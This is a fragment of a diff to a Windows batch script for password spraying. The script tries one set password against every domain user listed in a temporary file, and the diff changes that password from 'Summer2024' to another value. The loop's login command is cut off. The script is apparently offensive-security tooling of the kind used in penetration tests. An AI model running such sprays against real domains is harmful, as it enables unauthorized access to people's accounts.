@@ -32,7 +32,7 @@ rem Reset the command window title so you can see the progress of the password s
 title Command Prompt
 
 rem Set your password for the spray here
-set password=Summer2024
+set password=PASSWORD123456789
 
 rem Execute the password spray, trying the password set above for every user in the domain
 for /f %%n in (%temp%\users.txt) do (
